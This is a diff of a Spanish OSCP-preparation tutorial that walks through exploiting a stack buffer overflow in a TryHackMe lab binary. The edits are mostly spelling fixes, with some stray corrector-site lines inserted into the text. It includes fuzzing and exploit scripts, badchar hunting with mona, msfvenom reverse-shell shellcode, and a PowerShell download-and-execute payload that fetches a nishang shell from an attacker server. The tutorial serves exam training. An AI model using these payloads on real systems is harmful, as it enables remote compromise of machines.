@@ -1,6 +1,7 @@
 # ¡Preparación para Buffer Overflow OSCP!
 
-En esta ocasión les traigo una preparación para poder explotar el Buffer Overflow de la OSCP de manera exitosa. Es una maquina donde se pueden conseguir 25 puntos. Para el examen no se requieren conocimientos avanzados de explotacion en BoF como por ejemplo Bypass de ASLR, alcanzaria con practicar con las plataformas que adjunto y sus respectivas maquinas.
+En esta ocasión les traigo una preparación para poder explotar el Buffer Overflow de la OSCP de manera exitosa. Es una máquina donde se pueden conseguir 25 puntos. Para el examen no se requieren conocimientos avanzados de explotación en BoF como por ejemplo Bypass de ASLR, alcanzaría con practicar con las plataformas que adjunto y sus respectivas máquinas.
+
 
 Maquinas y servicios vulnerables : 
 
@@ -11,28 +12,32 @@ Maquinas y servicios vulnerables :
 -   Buffer Overflow Prep (Tryhackme)
 -  Overflow (HackTheBox)
 
-*En este caso para la explicasion de la explotacion voy a estar usando el binario de Buffer Overflow Prep.*
+*En este caso para la explicación de la explotación voy a estar usando el binario de Buffer Overflow Prep.*
 
-# Explicacion
+# Explicación
 
 Antes que nada vamos a hablar un poco sobre el BoF.
-El Buffer Overflow es un desbordamiento de la memoria de un programa, es decir del buffer.
-El buffer es una memoria de almacenamiento donde se puede guardar informacion como puede ser el input de un usuario, es decir podemos tener un software que nos pregunte por ejemplo nuestro nombre, para almacenar el nombre del usuario este software tiene un buffer limitado de 20 bytes. En el caso de que el usuario ponga mas caracteres o supere la cantidad de bytes los caracteres sobrantes empezarian a sobreescribir parte de la memoria del software causando de esa forma un desbordamiento haciendo que el software se rompa.
-La idea de la explotacion es poder sobreescribir parte de la memoria para poder colocar codigo malicioso.
+El Buffer Overflow es un desbordamiento de la memoria de un programa, es decir, del buffer.
+El buffer es una memoria de almacenamiento donde se puede guardar información como puede ser el input de un usuario, es decir podemos tener un software que nos pregunte por ejemplo nuestro nombre, para almacenar el nombre del usuario este software tiene un buffer limitado de 20 bytes. En el caso de que el usuario ponga más caracteres o supere la cantidad de bytes, los caracteres sobrantes empezarían a sobreescribir parte de la memoria del software, causando de esa forma un desbordamiento haciendo que el software se rompa.
+La idea de la explotación es poder sobreescribir parte de la memoria para poder colocar código malicioso.
+
 
 ## Requisitos
 Para poder explotar BoF necesitamos tener un sistema Windows 7 (x86), este mismo puede estar instalado en VM o VB.
-Una vez ya con el Windows 7 instalado debemos descargar programa que pueda Debuggear el software para poder ver a bajo nivel las instrucciones de ejecucion que este tiene.
+Una vez ya con el Windows 7 instalado debemos descargar programa que pueda Debuggear el software para poder ver a bajo nivel las instrucciones de ejecución que este tiene.
 *Recomiendo descargar [immunity debugger](https://www.immunityinc.com/products/debugger/)*
-*Recomiendo tener el plugin de Mona instalado ya que nos va a facilitar algunos pasos : [*Mona*](https://github.com/corelan/mona)
+*Recomiendo tener el plugin de Mona instalado, ya que nos va a facilitar algunos pasos : [*Mona*](https://github.com/corelan/mona)
 
 ## Empezamos
 
 Para la primer fase primero tenemos que detectar en que punto se genera el desbordamiento del Buffer, abrimos el Debugger y seleccionamos el binario a debuguear y seguidamente ponemos en escucha a netcat por el puerto 1337 para ver que recibimos:
 
-![Immunity Debugger — open oscp.exe](https://i.ibb.co/HHx1Px8/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)![Server](https://i.ibb.co/c24sD4D/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)Como vemos en la conexion por netcat recibimos un servidor el cual para empezar dice que pongamos el comando "HELP".
-Vemos que nos salen varias opciones como *OVERFLOW1 [value]* basicamente nos esta pidiendo que pongamos el comando overflow1 y que le pasemos un valor. En mi caso le pase el valor "test"  y se ve que se lo tomo bien el servidor ya que en el output puedo ver "Overflow1 COMPLETE".
-Ahora que pasaria si en vez de pasarle como parametro "test" le pasamos 2000 caracteres en este caso va a ser el caracter "A". Para eso utilizamos un script en python que empieza a mandarle bytes de forma incremental hasta llegar el punto de que el servidor se satura.
+![Immunity Debugger — open oscp.exe](https://i.ibb.co/HHx1Px8/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)![Server](https://i.ibb.co/c24sD4D/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)
+
+Como vemos en la conexión por netcat recibimos un servidor el cual para empezar dice que pongamos el comando "HELP".
+Vemos que nos salen varias opciones como *OVERFLOW1 [value]* básicamente nos está pidiendo que pongamos el comando overflow1 y que le pasemos un valor. En mi caso le pase el valor "test" y se ve que se lo tomo bien el servidor, ya que en el output puedo ver "Overflow1 COMPLETE".
+Ahora que pasaría si en vez de pasarle como parámetro "test" le pasamos 2000 caracteres, en este caso va a ser el carácter "A". Para eso utilizamos un script en python que empieza a mandarle bytes de forma incremental hasta llegar el punto de que el servidor se satura.
+
 
     import socket, time, sys
     ip = "IP MACHINE";  
@@ -55,46 +60,53 @@ Ahora que pasaria si en vez de pasarle como parametro "test" le pasamos 2000 car
 	        print("Could not connect to " + ip + ":" + str(port))  
 	        sys.exit(0)  
 	    time.sleep(1)
+
 ![Fuzzing](https://i.ibb.co/GdZrhyr/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)
+
 
 Podemos ver que el programa crashea al momento de llegar a los 2000 Bytes.
 Si revisamos el debugger vamos a ver como se crasheo el programa.
 **1** - Antes de crashear el programa
 **2** - Despues del crasheo
+
+
 ![Before Crash](https://i.ibb.co/vVTwNK5/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)![Server](https://i.ibb.co/PDmGdqy/2.png)
 *Una vez que el programa crashea lo volvemos a abrir con el debugger.*
 
 # EIP, ESP y JMP
 
 Antes de continuar tenemos que conocer que son las instrucciones EIP, EBP y ESP, ya que estas instrucciones van a ser las que permitan explotar el Buffer entendiendo como funcionan.
-**ESP** (Extended Stack Pointer): Es un puntero al final de la pila. Tras la ejecución de una función la dirección de retorno se vuelve a cargar en ESP para continuar la ejecución en el mismo punto donde había quedado.
+**ESP** (Extended Stack Pointer): Es un puntero al final de la pila. Tras la ejecución de una función, la dirección de retorno se vuelve a cargar en ESP para continuar la ejecución en el mismo punto donde había quedado.
 **EBP** (Extended Base Pointer): Según el compilador usado, EBP puede ser utilizado como registro de caracter general o como puntero al marco de la pila.
 **EIP** (Extended Instruction Pointer): Contiene la dirección actual de ejecución del programa.
 
 ![EIP-ESP-JMP](https://i.ibb.co/YdtNgpH/3.png)
 
-Cada una de estas instrucciones manejan el flujo del programa. A continuacion tenemos una imagen que representaria como se iria modificando ese Buffer.
-Para no entrar en muchos detalles tecnicos lo voy a explicar de una forma sencilla.
-Podemos ver los primeros 3 espacios de memoria que contienen "AAAA", esto representaria el espacio de memoria que nos ofrece el programa para poner X cantidad de Bytes / Caracteres.
-Si al programa le mandamos mas bytes, estos caracteres sobrantes van a empezar a sobreescribir los siguientes espacios de memoria (EBP -8, EBP -4, EBP). Como podemos ver en la imagen del Debugger EBP vale **41414141**, esto esta escrito en Hexadecimal, si buscamos la tabla **ASCII** podemos ver que el caracter "A" corresponderia al numero 41. Entonces en este caso el registro EBP fue remplazado por **"AAAA"**.
+Cada una de estas instrucciones manejan el flujo del programa. A continuación tenemos una imagen que representaría como se iría modificando ese Buffer.
+Para no entrar en muchos detalles técnicos lo voy a explicar de una forma sencilla.
+Podemos ver los primeros 3 espacios de memoria que contienen "AAAA", esto representaría el espacio de memoria que nos ofrece el programa para poner X cantidad de Bytes / Caracteres.
+Si al programa le mandamos más bytes, estos caracteres sobrantes van a empezar a sobreescribir los siguientes espacios de memoria (EBP -8, EBP -4, EBP). Como podemos ver en la imagen del Debugger EBP vale **41414141**, esto esta escrito en Hexadecimal, si buscamos la tabla **ASCII** podemos ver que el carácter "A" corresponderia al numero 41. Entonces en este caso el registro EBP fue remplazado por **"AAAA"**.
 En el caso de que se sigan mandando mas Bytes el buffer seguiria creciendo y empezaria a editar otros registros como puede ser el **RET** (Return Address) que en este caso lo vamos a llamar **EIP**.
-En el debugger podemos ver que **EIP** vale **41414141** como el EBP esto es porque el EIP se encarga de mantener el flujo del programa y le dice a que direccion tiene que apuntar, como el EIP se sobreescribio en este caso quiere apuntar a "AAAA" pero como no es una direccion valida el programa crashea.
+En el debugger podemos ver que **EIP** vale **41414141** como el EBP esto es porque el EIP se encarga de mantener el flujo del programa y le dice a que dirección tiene que apuntar, como el EIP se sobreescribió en este caso quiere apuntar a "AAAA" pero como no es una dirección válida el programa crashea.
+
 
 ![EIP-ESP-JMP](https://i.ibb.co/tb63NDF/image2.png)
 
 ## CAPTURAMOS OFFSET Y BARCHAR
 
-Cuando utilizamos el script hecho en python pudimos ver como al mandar 2000 bytes el programa crashea porque el EIP ya no tiene una direccion valida por donde seguir el flujo del programa, vamos a intentar calcular el Buffer del EIP es decir el espacio de memoria que tiene para poder controlar el flujo.
+Cuando utilizamos el script hecho en python pudimos ver como al mandar 2000 bytes el programa crashea porque el EIP ya no tiene una dirección válida por donde seguir el flujo del programa, vamos a intentar calcular el Buffer del EIP es decir el espacio de memoria que tiene para poder controlar el flujo.
 Para eso vamos a instalar una herramienta llamada **[GDB-PEDA](https://github.com/longld/peda)**
 
     git clone https://github.com/longld/peda.git ~/peda
 	echo "source ~/peda/peda.py" >> ~/.gdbinit
 
-Con Peda lo que vamos a generar un numero de caracteres random, estos caracteres tiene que ser los bytes con los que el programa se crasheo + 400. Es decir mi programa se crashea con 2000 bytes, entonces tengo que crear 2400 caracteres.
+Con Peda lo que vamos a generar un número de caracteres random, estos caracteres tiene que ser los bytes con los que el programa se crasheo + 400. Es decir, mi programa se crashea con 2000 bytes, entonces tengo que crear 2400 caracteres.
 Ej-2: Si mi programa se crashea al recibir 800 bytes, voy a generar 1200 caracteres.
 Ponemos en la consola gdb para iniciar peda y ponemos el comando *pattern_create bytes+400*:
 
 ![pattern](https://i.ibb.co/bRXsQt7/1-Pkv-BSPNn-BX5-Hsdc21-FURbw.png)
+
+
 Ya con la cantidad de bytes generados (en mi caso 2400) los copiamos y vamos a crear un script para empezar a generar nuestro exploit.
 	
 	    import socketip = "IP MACHINE"  
@@ -113,34 +125,55 @@ Ya con la cantidad de bytes generados (en mi caso 2400) los copiamos y vamos a c
 		except:  
 		  print("Could not connect.")
 
-Vamos a pegar donde dice "***payload***" los caracteres generados, les tendria que quedar de la siguiente forma:
+
+Vamos a pegar donde dice "***payload***" los caracteres generados, les tendría que quedar de la siguiente forma:
+
 ![pattern](https://i.ibb.co/r6hhdds/Captura-de-pantalla-2022-04-29-203809.png)
-Ya con el payload modificado ejecutamos el script para que mande los caracteres al programa y veamos como actua en el debugger.
-Aclaracion : El debugger debe tener el binario corriendo antes de lanzar el exploit.
+
+Ya con el payload modificado ejecutamos el script para que mande los caracteres al programa y veamos como actúa en el debugger.
+Aclaracion: El debugger debe tener el binario corriendo antes de lanzar el exploit.
 
 
 ![pattern](https://i.ibb.co/FVKz9Xt/Captura-de-pantalla-2022-05-03-174558.png)
+
+
 ![pattern](https://i.ibb.co/17SXz52/Captura-de-pantalla-2022-05-03-174558.png)
-Como dijimos antes la idea es poder sacar el Offset es decir el tamaño del buffer del EIP, vemos que en este caso despues de lanzar el exploit mi EIP tiene un valor de 41744441 (en el caso de ustedes el valor va a ser distinto).
-Ya teniendo el valor del EIP a traves de gdb podemos sacar el tamaño del EIP.
+
+
+Como dijimos antes la idea es poder sacar el Offset es decir el tamaño del buffer del EIP, vemos que en este caso después de lanzar el exploit mi EIP tiene un valor de 41744441 (en el caso de ustedes el valor va a ser distinto).
+Ya teniendo el valor del EIP a través de gdb podemos sacar el tamaño del EIP.
 inicializamos gdb en la consola y ponemos el siguiente comando : pattern_offset 0x[valorEIP].
 *Ejemplo de mi caso : pattern_offset 0x41744441*
+
+
+
 ![pattern](https://i.ibb.co/k4RBpNZ/Captura-de-pantalla-2022-05-03-174558.png)
 Podemos ver que el tamaño del EIP es 1978 bytes.
+
+
 Ya con esta información vamos a modificar el script del exploit.
-Cambiamos el valor del **offset**  vemos que quedaria en overflow = "A" x offset .
+Cambiamos el valor del **offset** vemos que quedaría en overflow = "A" x offset .
 De esta forma ya podemos controlar el valor de **EIP**.
-En el caso de **retn** vamos a poner "**BBBB**", este valor va a terminar siendo el de la direccion del EIP en el debugger.
-***Apareceria en hexadecimal es decir 42424242***
+En el caso de **retn** vamos a poner "**BBBB**", este valor va a terminar siendo el de la dirección del EIP en el debugger.
+***Aparecería en hexadecimal, es decir 42424242***
+
+
+
 ![pattern](https://i.ibb.co/WDfzgtd/Captura-de-pantalla-2022-05-03-174558.png)
+
+
 Ya con todo configurado volvemos a correr el binario en el debugger y lanzamos el exploit.
+
+
 ![pattern](https://i.ibb.co/XZt3pr6/IP.png)
 
-Vemos que el valor del EIP es "42424242" es decir "BBBB", ya pudiendo controlar el flujo del EIP la idea seria poder hacer que redireccione a una direccion maliciosa que se va a almacenar en **ESP** (Controla la pila)
-El problema en este punto es que no podemos generar un payload y que lo tome asi como asi.
-Para poder meter codigo malicioso habria que deshacernos de los BADCHARS, los badchars son caracteres que el sistema no logra interpretar y pueden hacer que la ejecusion del payload no funcione por lo tanto tenemos que sacar esos caracteres malos.
-Por ejemplo un badchar que viene por defecto es :  **\x00** 
+Vemos que el valor del EIP es "42424242" es decir "BBBB", ya pudiendo controlar el flujo del EIP la idea sería poder hacer que redireccione a una dirección maliciosa que se va a almacenar en **ESP** (Controla la pila)
+El problema en este punto es que no podemos generar un payload y que lo tome así como así.
+Para poder meter codigo malicioso habria que deshacernos de los BADCHARS, los badchars son caracteres que el sistema no logra interpretar y pueden hacer que la ejecución del payload no funcione por lo tanto tenemos que sacar esos caracteres malos.
+Por ejemplo, un badchar que viene por defecto es : **\x00**
 En el debugger vamos a poner el siguiente comando para asignarle una carpeta de trabajo al plugin de Mona:
+
+
 
     !mona config -set workingfolder c:\mona\%p
 
@@ -157,13 +190,19 @@ El script para generar badchar es el siguiente (por defecto ya excluye el x00):
     print()
 
 ![pattern](https://i.ibb.co/wNyV5wq/image2.png)
+
+
 Copiamos todos los badchar y los ponemos en el script del exploit en la variable payload : 
 ![pattern](https://i.ibb.co/MBZNy2b/image2.png)
+
+
 Lanzamos el exploit y en el debugger con el siguiente comando podemos ver si se detectaron badchars en la ejecución del exploit : 
 
     !mona compare -f C:\mona\oscp\bytearray.bin -a <addressESP>
 
 ![pattern](https://i.ibb.co/jr6d0c8/image2.png)
+
+
 Como ven en la siguiente imagen dice los badchar que se detectaron : 07 08 2e 2f a0 a1 (marcado en amarillo).
 Estos badchar no quiere decir que todos sean malos, sino que puede pasar que al corromperse uno haga que el siguiente lo detecte como badchar por eso mismo no podemos excluir todos de una vez, sino que tenemos que ir uno a uno.
 
@@ -174,71 +213,97 @@ Con mona ya excluimos el badchar "\x00", vamos a excluir el siguiente que seria 
 
 Volvemos a ejecutar el debugger con el binario y volvemos a lanzar el exploit.
 En el debugger volvemos a comparar para ver si siguen habiendo badchar
+
+
 ![pattern](https://i.ibb.co/BnbWqms/image2.png)
-Cuando vuelvo a hacer la comparacion me dice que todavia siguen habiendo badchars, en este caso el que seguiria por excluir seria el 2e (\x2e).
-Lo excluimos de mona y tambien lo borramos del script del exploit.
+Cuando vuelvo a hacer la comparación me dice que todavía siguen habiendo badchars, en este caso el que seguiría por excluir sería el 2e (\x2e).
+Lo excluimos de mona y también lo borramos del script del exploit.
+
 
     !mona bytearray -b "\x00\x07\x2e"
+    
+    
 Volvemos a debuggear el binario, borramos el badchar del script, lo ejecutamos y volvemos a comparar en el debugger para ver si siguen quedando badchars.
 
 ![pattern](https://i.ibb.co/MyHWfWN/image2.png)
-Vemos que el siguiente badchar seria el a0 (\xa0), repetimos el proceso de exclusion. 
-Primero lo excluimos de mona, volvemos a ejecutar el binario en el debugguer, despues lo borramos del script del exploit, volvemos a ejecutar el exploit y volvemos a comparar en el debugger:
+
+
+Vemos que el siguiente badchar sería el a0 (\xa0), repetimos el proceso de exclusión.
+Primero lo excluimos de mona, volvemos a ejecutar el binario en el debugguer, después lo borramos del script del exploit, volvemos a ejecutar el exploit y volvemos a comparar en el debugger:
+
+
 
     !mona bytearray -b "\x00\x07\x2e\xa0"
 
 ![pattern](https://i.ibb.co/NN4z5V1/image2.png)
-Como podemos ver ya no se detectan badchar, en la comparacion no aparece ningun badchar, el status es undifined significa que los badchar que no interpretaba mi binario eran los siguientes : **"\x00\x07\x2e\xa0"**
+
+
+Como podemos ver ya no se detectan badchar, en la comparación no aparece ningún badchar, el status es undifined significa que los badchar que no interpretaba mi binario eran los siguientes : **"\x00\x07\x2e\xa0"**
+
 
 
 
 # Generar payload malicioso para conseguir una reverse shell
 
-A traves de mona podemos detectar si el binario tiene algun tipo de proteccion que tengamos que Bypass, en el caso de la OSCP el binario viene sin proteccion.
-Los tipos de protecciones que hay son : Rebase, SafeSEH, ASLR, NX Compat, OS DLL.
+A través de mona podemos detectar si el binario tiene algún tipo de protección que tengamos que Bypass, en el caso de la OSCP el binario viene sin protección.
+Los tipos de protecciones que hay son: Rebase, SafeSEH, ASLR, NX Compat, OS DLL.
 En el caso del binario que estoy explotando vemos que tiene todo en *"False"* por lo tanto no tiene proteccion.
-Para ver si nuestro binario esta protegido ponemos : 
+Para ver si nuestro binario está protegido ponemos:
+
+
 
     !mona modules
 
 ![pattern](https://i.ibb.co/WK1mdXy/modules.png)
-Una vez detectados todos los badchar podemos empezar a generar nuestro codigo malicioso.
+
+
+Una vez detectados todos los badchar podemos empezar a generar nuestro código malicioso.
 Para hacer esto hay varias formas pero lo mas sencillo es utilizar msfvenom que es una herramienta para poder generar shellcodes.
 
 - LHOST = Nuestra direccion IP
 - LPORT = Puerto por el cual se va a generar la conexion inversa
 - -b = especificamos los badchar, en mi caso son : “\x00\x07\x2e\xa0”
-- EXITFUNC = Funcion que genera un hilo sobre el proceso, en el caso de que el proceso padre falle quede el hilo para que no se pierda la conexion.
+- EXITFUNC = Función que genera un hilo sobre el proceso, en el caso de que el proceso padre falle quede el hilo para que no se pierda la conexion.
 
     msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b “\x00\x07\x2e\xa0” -f c
 
 
 ![pattern](https://i.ibb.co/jyty8F1/image2.png)
+
+
 Copiamos todo el shellcode y lo pegamos en el payload del exploit
 Les tendria que quedar algo como esto : 
+
 ![pattern](https://i.ibb.co/WxG5WWX/image2.png)
 
 # Exploción
 
-Ya tenemos lo que seria nuestra codigo malicioso que nos va a servir para hacer el desbordamiento del buffer y de esa forma hacer una reverse shell para poder tener control del sistema, el problema es que este shellcode malicioso se esta injectando en el EIP y eso haria que se siga crasheando, lo que necesitamos hacer es hacer que el EIP redireccione al ESP para que sea ejecutado en la pila.
-Bien para eso necesitamos conseguir un registro de tipo jumper, tenemos que encontrar una direccion que pase por el ESP para decirle al EIP que utilice ese jumper point.
-Ponemos el siguiente comando para buscar el jumper : 
+Ya tenemos lo que sería nuestra código malicioso que nos va a servir para hacer el desbordamiento del buffer y de esa forma hacer una reverse shell para poder tener control del sistema, el problema es que este shellcode malicioso se está inyectando en el EIP y eso haría que se siga crasheando, lo que necesitamos hacer es hacer que el EIP redireccione al ESP para que sea ejecutado en la pila.
+Bien, para eso necesitamos conseguir un registro de tipo jumper, tenemos que encontrar una dirección que pase por el ESP para decirle al EIP que utilice ese jumper point.
+Ponemos el siguiente comando para buscar el jumper :
 Tienen que reemplazar mis badchar por los de ustedes.
+
+
 
     !mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
 
 ![pattern](https://i.ibb.co/NWtfycW/Captura-de-pantalla-2022-05-06-045022.png)
-Podemos ver en los resultados que existen varios jumpers point, vamos a elegir el primero que en mi caso es la direccion **625011af**.
-Ahora esta direccion la tenemos que colocar en el exploit en la parte de **retn** que si no recuerdan es lo que modifica el EIP.
-La direccion la tenemos que poner en hexadecimal y respetando el formato *Little endian* que significa de reversa :
+
+
+Podemos ver en los resultados que existen varios jumpers point, vamos a elegir el primero que en mi caso es la dirección **625011af**.
+Ahora esta dirección la tenemos que colocar en el exploit en la parte de **retn** que si no recuerdan es lo que modifica el EIP.
+La dirección la tenemos que poner en hexadecimal y respetando el formato *Little endian* que significa de reversa :
 *Normal* : \x62\x50\x11\xaf
 *Little endian* : \xaf\x11\x50\x62
 
-Algo que puede surgir es que al momento de lanzar el exploit el EIP vaya directamente al ESP y no lo interprete para eso vamos a agregar algo llamado **NOPS** (No Operation Code).
-Los NOPS son porciones de codigo que se pueden decir que no hacen nada, como bien dice el nombre no ejecutan ningun tipo de accion pero le da tiempo al shellcode se decodifique en la pila.
-el NOP lo agregamos en la parte de padding. Uno muy conocido es el caracter hexadecimal "\x90".
-Lo agregamos en padding y lo multiplicamos por un valor, uno recomendado seria multiplicar este NOP x 16.
-El script completo quedaria de la siguente forma : 
+Algo que puede surgir es que al momento de lanzar el exploit el EIP vaya directamente al ESP y no lo interprete, para eso vamos a agregar algo llamado **NOPS** (No Operation Code).
+Los NOPS son porciones de codigo que se pueden decir que no hacen nada, como bien dice el nombre, no ejecutan ningún tipo de acción, pero le da tiempo al shellcode se decodifique en la pila.
+El NOP lo agregamos en la parte de padding. Uno muy conocido es el carácter hexadecimal "\x90".
+Lo agregamos en padding y lo multiplicamos por un valor, uno recomendado sería multiplicar este NOP x 16.
+El script completo quedaría de la siguiente forma :
+
+
+Corregido con https://www.corrector.co/es/
 
     import socket
     
@@ -325,8 +390,11 @@ El script completo quedaria de la siguente forma :
 
 # Servidor para establecer la conexión
 
-Lo ultimo que faltaria hacer seria abrir un servidor ya sea con nc, socat, rlwrap, python etc.
-Les dejo ejemplos para poner en escucha varios de estos servicios por si alguno les genera algun problema:
+Lo último que faltaría hacer sería abrir un servidor ya sea con nc, socat, rlwrap, python etc.
+Les dejo ejemplos para poner en escucha varios de estos servicios por si alguno les genera algún problema:
+
+
+Corregido con https://www.corrector.co/es/
 
     nc -lvp [puertoDeShellCode]
     socat TCP-LISTEN:[puertoDeShellCode] stdout
@@ -335,11 +403,16 @@ Les dejo ejemplos para poner en escucha varios de estos servicios por si alguno 
 En mi caso voy a abrir el servidor con nc, lanzamos el exploit y que surja la **magia**.
 
 ![pattern](https://i.ibb.co/KWXQxWK/image2.png)
+
+
 # Accediendo a traves de una PowerShell
-Una de las cosas que podemos hacer es acceder desde una PowerShell para poder tener un poco mas de control sobre la maquina ya que tenemos el control total sobre el EIP y ESP podemos variar la forma de acceder y de esa forma tener una alternativa.
+Una de las cosas que podemos hacer es acceder desde una PowerShell para poder tener un poco más de control sobre la máquina ya que tenemos el control total sobre el EIP y ESP podemos variar la forma de acceder y de esa forma tener una alternativa.
 
 Lo primero que vamos a hacer es descargar y configurar una utilidad llamada nishang con los siguientes comandos :
-*En el caso del ultimo comando "echo" hay que configurar la  IP y el puerto del servidor del atacante por el cual se va a establecer la conexion*
+*En el caso del último comando "echo" hay que configurar la IP y el puerto del servidor del atacante por el cual se va a establecer la conexion*
+
+
+Corregido con https://www.corrector.co/es/
 
 
     sudo git clone https://github.com/samratashok/nishang
@@ -353,6 +426,8 @@ Lo primero que vamos a hacer es descargar y configurar una utilidad llamada nish
     msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1:8000/Invoke-PowerShellTcp.ps1')" EXITFUNC=thread -b “\x00\x07\x2e\xa0” -f c
 
 ![pattern](https://i.ibb.co/Np7KCvp/nasm.png)
+
+
 Copiamos el shellcode generado y lo pegamos en el exploit en la parte de ***"payload"***
 Entramos dentro de la carpeta de nishang, despues a la carpeta Shells y nos compartimos un servicio HTTP con python : 
 
@@ -364,25 +439,28 @@ A su vez en otra consola vamos a poner a la escucha a netcat por el puerto que p
 
 Ya con el servicio HTTP de python y netcat a la escucha, lanzamos el exploit.
 ![pattern](https://i.ibb.co/MfL4FLQ/nasm.png)
+
+
 De esta forma se puede acceder con acceso a una PowerShell.
-Puede parecer medio enredado el proceso pero despues de practicarlo algunas veces sale por instinto propio.
+Puede parecer medio enredado el proceso,, pero después de practicarlo algunas veces sale por instinto propio.
 
-
-#  - Fin / Extra
-El BoF es una tecnica que solamente se puede aprender si se practica, las plataformas como Tryhackme, HackTheBox, Vulnhub entre otras ofrecen miles de maquinas las cuales son vulnerables al desbordamiento de buffer, puede ser algo abrumador de entender a la primera si sos nuevo en esto pero es cuestion de practica.
-Espero que te haya podido ser util para entender mas como funciona el BoF y en el mejor de los casos que hayas podido explotar el binario.
-Cualquier tipo de consulta / ayuda no duden en contactarme por mis redes como **[Linkedin](https://www.linkedin.com/in/beta-casanova/)** 
+# - Fin / Extra
+El BoF es una técnica que solamente se puede aprender si se practica, las plataformas como Tryhackme, HackTheBox, Vulnhub entre otras ofrecen miles de máquinas las cuales son vulnerables al desbordamiento de buffer, puede ser algo abrumador de entender a la primera si sos nuevo en esto, pero es cuestión de práctica.
+Espero que te haya podido ser útil para entender más como funciona el BoF y en el mejor de los casos que hayas podido explotar el binario.
+Cualquier tipo de consulta / ayuda no duden en contactarme por mis redes como **[Linkedin](https://www.linkedin.com/in/beta-casanova/)**
 Si te interesa tener clases personalizadas en vivo no dudes en contactarme.
-Como extra quisiera dejar una alternativa a los NOPS, en el caso de no querer usarlos hay una tecnica donde basicamente se hace un desplazamiento del ESP (de la pila).
+Como extra quisiera dejar una alternativa a los NOPS, en el caso de no querer usarlos hay una técnica donde básicamente se hace un desplazamiento del ESP (de la pila).
 Cuando EIP apunta al ESP que es donde esta nuestro shellcode, con el desplazamiento movemos el ESP una X cantidad de lugares y antes de que se ejecute nuestro shellcode va a ejecutar una serie de instrucciones que no tienen que ver con nuestras instrucciones, haciendo que una vez que estas instrucciones se ejecuten empiece a ejecutarse nuestro shellcode.
-Para hacer esto vamos a usar nams_shell lo podemos descargar desde este repositorio : [namsoshell](https://github.com/fishstiqz/nasmshell)
-lo ejecutamos con python y escribimos:
+Para hacer esto vamos a usar nams_shell lo podemos descargar desde este repositorio:  [namsoshell](https://github.com/fishstiqz/nasmshell)
+lo ejecutamos con Python y escribimos:
 
-    sub esp,0x10
- *En este caso estamos haciendo un desplazamiento de la pila de 10 unidades*
- Esto nos va a devolver un resultado que lo tenemos que pasar a hexadecimal y lo colocamos en el exploit en la parte de **padding** (donde previamente estaban los NOPS) :
- *Normal : 83EC10
- Hexadecimal : \x83\xEC\x10*
+sub esp,0x10
+*En este caso estamos haciendo un desplazamiento de la pila de 10 unidades*
+Esto nos va a devolver un resultado que lo tenemos que pasar a hexadecimal y lo colocamos en el exploit en la parte de **padding** (donde previamente estaban los NOPS) :
+*Normal : 83EC10
+Hexadecimal : \x83\xEC\x10*
+
+
 
  ![pattern]( https://i.ibb.co/RjZ2h45/nasm.png)
 
